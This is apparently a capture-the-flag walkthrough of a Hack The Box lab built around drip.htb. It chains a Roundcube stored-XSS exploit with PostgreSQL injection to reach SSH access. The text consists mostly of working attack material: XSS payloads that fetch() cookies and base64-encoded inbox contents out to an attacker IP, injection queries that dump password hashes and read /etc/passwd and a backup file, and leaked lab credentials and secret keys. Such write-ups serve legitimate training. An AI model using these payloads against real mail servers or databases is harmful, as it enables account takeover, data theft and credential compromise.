## HOST RECON

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-title: DripMail
|_Requested resource was index
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- anyone AD ports, initial access maybe by web app

## WEB RECON

```
http://drip.htb/

http://mail.drip.htb/

http://drip.darkcorp.htb/ (email sender)
```

- regitser in http://drip.htb/register

- login at http://mail.drip.htb/


## mail.drip.htb

```
Roundcube Webmail 1.6.7
Copyright © 2005-2022, The Roundcube Dev Team

Installed plugins
Plugin	Version	License	Source
filesystem_attachments	1.0	GPL-3.0+	
jqueryui	1.13.2	GPL-3.0+	
```

- (https://gist.github.com/thomascube/3ace32074e23fca0e6510e500bd914a1, https://github.com/ropbear/CVE-2017-16651)

```
mport messages
You can upload mail using files in MIME or Mbox format. Multiple files can be compressed into zip archives.
```

```
Hi testando,
Welcome to DripMail! We’re excited to provide you convenient email solutions!. If you need help, please reach out to us at support@drip.htb.


Return-Path: <no-reply@drip.htb>
Delivered-To: testando@drip.htb
Received: from drip.htb
    by drip.darkcorp.htb with LMTP
    id yHNQHpEJqWfkOwAA8Y1rLw
    (envelope-from <no-reply@drip.htb>)
    for <testando@drip.htb>; Sun, 09 Feb 2025 13:01:21 -0700
Received: from drip.darkcorp.htb (localhost [127.0.0.1])
    by drip.htb (Postfix) with ESMTP id 32063AA6
    for <testando@drip.htb>; Sun, 9 Feb 2025 13:01:21 -0700 (MST)
Content-Type: text/plain; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Subject: Welcome to DripMail!
From: no-reply@drip.htb
To: testando@drip.htb
Date: Sun, 09 Feb 2025 13:01:20 -0700
Message-ID: <173913128037.650.437557471552868360@drip.darkcorp.htb>
Reply-To: support@drip.htb
```

#### registered account as root

- a cronjob send email for root every 5 min i guess

```
Cron <root@drip> /root/scripts/mail_clean.sh 

/usr/bin/rm: cannot remove '/var/mail/ebelford/dovecot*': No such file or directory
/usr/bin/rm: cannot remove '/var/mail/support/dovecot*': No such file or directory

Return-Path: <root@drip.htb>
Delivered-To: root@drip.htb
Received: from drip.htb
    by drip.darkcorp.htb with LMTP
    id OH6KLaEvqmfWKgAA8Y1rLw
    (envelope-from <root@drip.htb>)
    for <root@drip.htb>; Mon, 10 Feb 2025 09:56:01 -0700
Received: by drip.htb (Postfix, from userid 0)
    id B6490880; Mon, 10 Feb 2025 09:56:01 -0700 (MST)
From: root@drip.htb (Cron Daemon)
To: root@drip.htb
Subject: Cron <root@drip> /root/scripts/mail_clean.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20250210165601.B6490880@drip.htb>
Date: Mon, 10 Feb 2025 09:56:01 -0700 (MST)
```


#### in contact http://drip.htb/index#contact form send a email for it self, intercepting request and alter recipient data

```
Customer Information Request 

só teste

Confidentiality Notice: This electronic communication may contain confidential or privileged information. Any unauthorized review, use, disclosure, copying, distribution, or taking of any part of this email is strictly prohibited.
If you suspect that you've received a "phishing" e-mail, please forward the entire email to our security engineer at bcase@drip.htb



Return-Path: <root@drip.htb>
Delivered-To: root@drip.htb
Received: from drip.htb
    by drip.darkcorp.htb with LMTP
    id YLEXBAQxqmdlQQAA8Y1rLw
    (envelope-from <root@drip.htb>)
    for <root@drip.htb>; Mon, 10 Feb 2025 10:01:56 -0700
Received: from drip.darkcorp.htb (localhost [127.0.0.1])
    by drip.htb (Postfix) with ESMTP id E9AA3236E
    for <root@drip.htb>; Mon, 10 Feb 2025 10:01:55 -0700 (MST)
Content-Type: text/plain; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Subject: Customer Information Request
From: =?utf-8?q?teste?= <root@drip.htb>
To: root@drip.htb
Date: Mon, 10 Feb 2025 10:01:55 -0700
Message-ID: <173920691522.658.3264444127344114586@drip.darkcorp.htb>
Reply-To: root@drip.htb
```

## drip.darkcorp.htb


http://drip.darkcorp.htb/dashboard/.env

```
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

## exploring cves 2024-37383 and 2024-42009 stored xss throught roundcube client, trigger xss to read inbox users

- https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/

- https://github.com/amirzargham/CVE-2024-37383-exploit


```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('http://10.10.14.132:8000',{
method:'POST',mode:'no-cors',body:document.cookie}) foo=bar">
  Foo
</body>
```

#### final xss payload to exfil data

- 1 setup python web server
- 2 send payload by http://drip.htb/index#contact form
- 3 intercept request and change this "content=html&recipient=bcase@drip.htb"
- 4 after send check the python web server with b64 result
- 5 cat result_b64 | base64 -d > index.html 

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=addressbook&_action=list&_source=0&_remote=1&_unlock=loading1739295147922&_=1739295147775').then(r=>r.text()).then(t=>fetch(`http://10.10.14.140:8000/${btoa(t)}`)) foo=bar">
  Foo
</body>
```

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_caps=pdf=1,flash=0,tiff=0,webp=1,pgpmime=0&_uid=2&_mbox=INBOX&_framed=1&_action=preview').then(r=>r.text()).then(t=>fetch(`http://10.10.14.140:8000/${btoa(t)}`))
 foo=bar">
  Foo
</body>
```
```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_action=show&_uid=1&_mbox=INBOX&_extwin=1').then(r=>r.text()).then(t=>fetch('http://10.10.14.140:8000/c=${btoa(t)}'))
 foo=bar">
  Foo
</body>
```


#### email uid=2

```
Subject: Analytics Dashboard
Contact photo
From ebelford on 2024-12-24 13:38
From    ebelford
To  bcase@drip.htb
Date    2024-12-24 13:38
Headers
Attachments
Message Body
Hey Bryce,

The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.

You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.

If you encounter any issues or have feedback, let me know so I can address them promptly.

Thanks
```

## dev-a3f1-01.drip.htb

- dev-a3f1-01.drip.htb is other login page. Go to reset token and put bcase emai for reset pass, later get the email uid=5 with reset pass link. And then login into dev-a3f1-01.drip.htb.

```
Subject: Reset token
Contact photo
From no-reply@drip.htb on 2025-02-11 14:34
From    no-reply@drip.htb
To  bcase@drip.htb
Reply-To    support@drip.htb
Date    Today 14:34
Headers
Attachments
Message Body
Your reset token has generated. �Please reset your password within the next 5 minutes.

You may reset your password here: http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z6vCWQ.8UZOLNrsCtNT3f3W4DVlJo3RI7I
```


#### search bar has sqli

```
Image placeholder
Chris Wood
Online
Image placeholder
Jose Leos
In a meeting
Image placeholder
Bryce Case Jr.
Offline
Image placeholder
Neil Sims
```

```
(psycopg2.errors.UndefinedColumn) column "testando" does not exist LINE 1: SELECT * FROM "Users" WHERE "Users".username = testando ^ [SQL: SELECT * FROM "Users" WHERE "Users".username = testando] (Background on this error at: https://sqlalche.me/e/20/f405)
```

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

```
''; SELECT version();
PostgreSQL 15.10 (Debian 15.10-0+deb12u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit

''; SELECT current_database();
dripmail


''; SELECT current_schema();
public


''; SELECT user;
dripmail_dba


''; SELECT distinct(schemaname) FROM pg_tables;
public
pg_catalog
information_schema


''; SELECT table_name FROM information_schema.tables;
Users
pg_statistic
pg_type
Admins
pg_foreign_table
pg_authid
pg_shadow
pg_roles
pg_statistic_ext_data
pg_settings
pg_file_settings
pg_hba_file_rules
pg_ident_file_mappings
pg_config
pg_shmem_allocations
pg_backend_memory_contexts
pg_user_mapping
pg_stat_activity
pg_replication_origin_status
pg_subscription
pg_attribute
pg_proc
pg_class
pg_attrdef
pg_constraint
pg_inherits
pg_index
pg_stat_replication
pg_stat_slru
pg_stat_wal_receiver
pg_stat_recovery_prefetch
pg_operator
pg_opfamily
pg_opclass
pg_am
pg_amop
pg_amproc
pg_language
pg_largeobject_metadata
pg_aggregate
pg_statistic_ext
pg_rewrite
pg_trigger
pg_event_trigger
pg_description
pg_cast
pg_enum
pg_namespace
pg_conversion
pg_depend
pg_database
pg_db_role_setting
pg_tablespace
pg_auth_members
pg_shdepend
pg_shdescription
pg_ts_config
pg_ts_config_map
pg_ts_dict
pg_ts_parser
pg_ts_template
pg_extension
pg_foreign_data_wrapper
pg_foreign_server
pg_policy
pg_replication_origin
pg_default_acl
pg_init_privs
pg_seclabel
pg_shseclabel
pg_collation
pg_parameter_acl
pg_partitioned_table
pg_range
pg_transform
pg_sequence
pg_publication
pg_publication_namespace
pg_publication_rel
pg_subscription_rel
pg_group
pg_user
pg_policies
pg_rules
pg_views
pg_tables
pg_matviews
pg_indexes
pg_sequences
pg_stats
pg_stats_ext
pg_stats_ext_exprs
pg_publication_tables
pg_locks
pg_cursors
pg_available_extensions
pg_available_extension_versions
pg_prepared_xacts
pg_prepared_statements
pg_seclabels
pg_timezone_abbrevs
pg_timezone_names
pg_stat_sys_tables
pg_stat_xact_sys_tables
pg_stat_user_tables
pg_stat_all_tables
pg_stat_xact_all_tables
pg_stat_xact_user_tables
pg_statio_all_tables
pg_statio_sys_tables
pg_statio_user_tables
pg_stat_all_indexes
pg_stat_sys_indexes
pg_stat_user_indexes
pg_statio_all_indexes
pg_statio_sys_indexes
pg_statio_user_indexes
pg_statio_all_sequences
pg_statio_sys_sequences
pg_statio_user_sequences
pg_stat_subscription
pg_stat_ssl
pg_stat_gssapi
pg_replication_slots
pg_stat_replication_slots
pg_stat_database
pg_stat_database_conflicts
pg_stat_user_functions
pg_stat_xact_user_functions
pg_stat_archiver
pg_stat_bgwriter
pg_stat_wal
pg_stat_progress_analyze
pg_stat_progress_vacuum
pg_stat_progress_cluster
pg_stat_progress_create_index
pg_stat_progress_basebackup
pg_stat_progress_copy
pg_user_mappings
pg_stat_subscription_stats
pg_largeobject
role_column_grants
information_schema_catalog_name
column_domain_usage
applicable_roles
administrable_role_authorizations
domain_constraints
attributes
column_privileges
character_sets
check_constraint_routine_usage
check_constraints
column_udt_usage
collations
collation_character_set_applicability
key_column_usage
column_column_usage
columns
domain_udt_usage
constraint_column_usage
constraint_table_usage
domains
referential_constraints
enabled_roles
parameters
routine_column_usage
routine_privileges
role_routine_grants
routine_routine_usage
table_privileges
routine_sequence_usage
routine_table_usage
udt_privileges
routines
role_table_grants
schemata
sequences
sql_features
tables
sql_implementation_info
sql_parts
sql_sizing
transforms
table_constraints
view_routine_usage
role_udt_grants
triggered_update_columns
triggers
user_defined_types
usage_privileges
role_usage_grants
view_column_usage
view_table_usage
views
data_type_privileges
_pg_foreign_table_columns
element_types
column_options
_pg_foreign_data_wrappers
foreign_data_wrapper_options
foreign_data_wrappers
_pg_foreign_servers
foreign_server_options
foreign_servers
_pg_foreign_tables
foreign_table_options
foreign_tables
_pg_user_mappings
user_mapping_options
user_mappings



''; SELECT column_name FROM information_schema.columns WHERE table_name='Users';
username
password
email
host_header
ip_address

''; SELECT column_name FROM information_schema.columns WHERE table_name='Admins';
id
username
password
email


''; SELECT username,password,email FROM "Admins";
bcase
c4d1f46dba7ced2f9fba8a3eb737c751

''; SELECT username,password,email FROM "Users";
support
d9b9ecbf29db8054b21f303072b37c4e
bcase
1eace53df87b9a15a37fdc11da2d298d  d595878cf4d099846b16890e7d9fc490
ebelford
0cebd84e066fd988e89083879e88c5f9

''; SELECT pg_read_file('/etc/passwd', 0, 200000);
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash
postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
postfix:x:103:111::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:104:113:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:105:114:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
vmail:x:5000:5000::/home/vmail:/usr/bin/nologin
avahi:x:106:115:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
ntpsec:x:107:116::/nonexistent:/usr/sbin/nologin
sssd:x:108:117:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
_chrony:x:109:118:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash



''; SELECT pg_read_file('/var/backups/postgres/dev-dripmail.old.sql');

COPY public."Admins" (id, username, password, email) FROM stdin;
1   bcase   dc5484871bc95c4eab58032884be7225    bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb victor1gustavo@#
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb ThePlague61780
\.


--
-- Data for Name: Users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."Users" (id, username, password, email, host_header, ip_address) FROM stdin;
5001    support d9b9ecbf29db8054b21f303072b37c4e    support@drip.htb    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0   10.0.50.10
5002    bcase   1eace53df87b9a15a37fdc11da2d298d    bcase@drip.htb  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0   10.0.50.10
5003    ebelford    0cebd84e066fd988e89083879e88c5f9    ebelford@drip.htb   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0   10.0.50.10
\.
```
```
victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb victor1gustavo@#
ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb ThePlague61780
```

## ssh as ebelford

```
ebelford@drip:~$ ip r
default via 172.16.20.1 dev eth0 onlink 
172.16.20.0/24 dev eth0 proto kernel scope link src 172.16.20.3 

ebelford@drip:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:84:03:02 brd ff:ff:ff:ff:ff:ff
    inet 172.16.20.3/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
```

```
ebelford@drip:~$ netstat -napt | grep 172.16.20.3
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 172.16.20.3:22          172.16.20.1:64837       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64853       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:44316       172.16.20.1:593         ESTABLISHED 12074/./agent       
tcp        0      0 172.16.20.3:80          172.16.20.1:64857       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:59260       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64812       FIN_WAIT2   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64877       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64824       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64856       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64822       FIN_WAIT2   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64836       ESTABLISHED -                   
tcp        0      0 172.16.20.3:49766       172.16.20.1:135         ESTABLISHED 12074/./agent       
tcp        0      0 172.16.20.3:80          172.16.20.1:64850       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64870       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64876       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:64696       ESTABLISHED -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:63472       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64811       FIN_WAIT2   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64868       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64863       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64851       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64841       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64848       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64864       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64840       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64852       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64867       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64833       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64855       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64861       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64885       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64859       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64847       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64816       FIN_WAIT2   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64838       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:64858       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:64790       ESTABLISHED -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:56610       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64874       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64843       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:63864       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64815       FIN_WAIT2   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64873       ESTABLISHED -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:59081       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64871       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:35810       172.16.20.2:5000        TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64886       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64846       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64842       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:64862       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:48776       10.10.14.205:4444       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64872       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:57442       10.10.16.35:11601       ESTABLISHED 1950/./lin_agent    
tcp        0      0 172.16.20.3:35360       172.16.20.1:389         ESTABLISHED -                   
tcp        0      0 172.16.20.3:53326       10.10.14.249:9999       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:43688       10.10.14.205:4444       CLOSE_WAIT  -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:64849       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64839       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64821       FIN_WAIT2   -                   
tcp        0      0 172.16.20.3:22          172.16.20.1:64401       ESTABLISHED -                   
tcp        0      0 172.16.20.3:41746       172.16.20.2:5000        TIME_WAIT   -                   
tcp        0      0 172.16.20.3:43264       10.10.14.249:9999       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64854       TIME_WAIT   -                   
tcp        0   3444 172.16.20.3:22          172.16.20.1:64738       ESTABLISHED -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64844       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64845       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:80          172.16.20.1:64860       TIME_WAIT   -                   
tcp        0      0 172.16.20.3:58838       172.16.20.1:636         ESTABLISHED 64699/python3       
tcp        0      0 172.16.20.3:58590       10.10.14.199:11601      ESTABLISHED 12074/./agent       
tcp        0      0 172.16.20.3:44322       172.16.20.1:593         ESTABLISHED 12074/./agent 
```

```
tcp        0      0 drip.darkcorp.htb:44316 DC-01:593               ESTABLISHED
tcp        0      0 drip.darkcorp.htb:60816 172.16.20.2:epmap       ESTABLISHED
tcp        0      0 drip.darkcorp.htb:ssh   DC-01:59260             ESTABLISHED
tcp        0      0 drip.darkcorp.htb:43522 DC-01:http              TIME_WAIT  
tcp        0      0 localhost:49476         localhost:postgresql    TIME_WAIT  
tcp        0    316 drip.darkcorp.htb:ssh   DC-01:65183             ESTABLISHED
tcp        0      0 drip.darkcorp.htb:46976 172.16.20.2:49664       ESTABLISHED
tcp        0      0 localhost:imap2         localhost:42700         TIME_WAIT  
tcp        0      0 localhost:35126         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:35132         localhost:postgresql    TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:49766 DC-01:epmap             ESTABLISHED
tcp        0      0 localhost:49452         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:56834         localhost:imap2         TIME_WAIT  
tcp        0      0 localhost:42706         localhost:imap2         TIME_WAIT  
tcp        0      0 localhost:imap2         localhost:54036         TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:46274 DC-01:5985              ESTABLISHED
tcp        0      0 drip.darkcorp.htb:ssh   DC-01:64696             ESTABLISHED
tcp        0      0 localhost:imap2         localhost:55054         TIME_WAIT  
tcp        0      0 localhost:55078         localhost:imap2         TIME_WAIT  
tcp        0      0 localhost:36110         localhost:postgresql    ESTABLISHED
tcp        0      0 drip.darkcorp.htb:ssh   DC-01:63472             ESTABLISHED
tcp        0      0 drip.darkcorp.htb:36700 172.16.20.2:49666       ESTABLISHED
tcp        0      0 localhost:33803         localhost:52300         ESTABLISHED
tcp        0      0 localhost:postgresql    localhost:41340         TIME_WAIT  
tcp        0      0 localhost:42580         localhost:postgresql    ESTABLISHED
tcp        0      0 localhost:58642         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:imap2         localhost:42694         TIME_WAIT  
tcp        0      0 localhost:35890         localhost:http          ESTABLISHED
tcp        0      0 localhost:imap2         localhost:56836         TIME_WAIT  
tcp        0      0 localhost:52314         localhost:33803         ESTABLISHED
tcp        0      0 localhost:postgresql    localhost:40452         ESTABLISHED
tcp        0      0 localhost:postgresql    localhost:42580         ESTABLISHED
tcp        0      0 localhost:http          localhost:50870         ESTABLISHED
tcp        0      0 localhost:imap2         localhost:42060         TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:ssh   DC-01:56610             ESTABLISHED
tcp        0      0 localhost:postgresql    localhost:35114         TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:40868 172.16.20.2:49667       ESTABLISHED
tcp        0      0 localhost:42690         localhost:imap2         TIME_WAIT  
tcp        0      0 localhost:42048         localhost:imap2         TIME_WAIT  
tcp        0      0 localhost:postgresql    localhost:49458         TIME_WAIT  
tcp        0      0 localhost:34880         localhost:postgresql    ESTABLISHED
tcp        0      0 drip.darkcorp.htb:ssh   DC-01:63864             ESTABLISHED
tcp        0      0 localhost:33803         localhost:52314         ESTABLISHED
tcp        0      0 localhost:58670         localhost:postgresql    TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:ssh   DC-01:59081             ESTABLISHED
tcp        0      0 localhost:56528         localhost:56519         ESTABLISHED
tcp        0      0 localhost:51452         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:49474         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:postgresql    localhost:34880         ESTABLISHED
tcp        0      0 localhost:54048         localhost:imap2         TIME_WAIT  
tcp        0      0 localhost:postgresql    localhost:36110         ESTABLISHED
tcp        0      0 localhost:42076         localhost:imap2         TIME_WAIT  
tcp        0      0 localhost:http          localhost:35890         ESTABLISHED
tcp        0      0 localhost:51466         localhost:postgresql    TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:48776 10.10.14.205:4444       ESTABLISHED
tcp        0      0 localhost:58678         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:36100         localhost:postgresql    ESTABLISHED
tcp        0      0 localhost:50870         localhost:http          ESTABLISHED
tcp        0      0 localhost:52300         localhost:33803         ESTABLISHED
tcp        0      0 drip.darkcorp.htb:43742 DC-01:ldap              ESTABLISHED
tcp        0      0 drip.darkcorp.htb:ssh   DC-01:65096             ESTABLISHED
tcp        0      0 localhost:55066         localhost:imap2         TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:44694 172.16.20.2:5000        TIME_WAIT  
tcp        0      0 localhost:imap2         localhost:42050         TIME_WAIT  
tcp        0      0 localhost:56860         localhost:imap2         TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:57442 10.10.16.35:11601       ESTABLISHED
tcp        0      0 drip.darkcorp.htb:45546 172.16.20.2:49665       ESTABLISHED
tcp        0      0 drip.darkcorp.htb:43688 10.10.14.205:4444       CLOSE_WAIT 
tcp        0      0 localhost:40452         localhost:postgresql    ESTABLISHED
tcp        0      0 localhost:41348         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:51492         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:41354         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:41326         localhost:postgresql    TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:ssh   DC-01:65185             ESTABLISHED
tcp        0      0 localhost:imap2         localhost:54038         TIME_WAIT  
tcp        0      0 drip.darkcorp.htb:ssh   DC-01:64401             ESTABLISHED
tcp        0      0 localhost:54026         localhost:imap2         TIME_WAIT  
tcp        0      0 localhost:55052         localhost:imap2         TIME_WAIT  
tcp        0      0 localhost:56519         localhost:56528         ESTABLISHED
tcp        0      0 localhost:57040         localhost:http          TIME_WAIT  
tcp        0      0 localhost:imap2         localhost:56844         TIME_WAIT  
tcp        0      0 localhost:postgresql    localhost:36100         ESTABLISHED
tcp        0      0 localhost:35102         localhost:postgresql    TIME_WAIT  
tcp        0      0 localhost:51480         localhost:postgresql    TIME_WAIT  
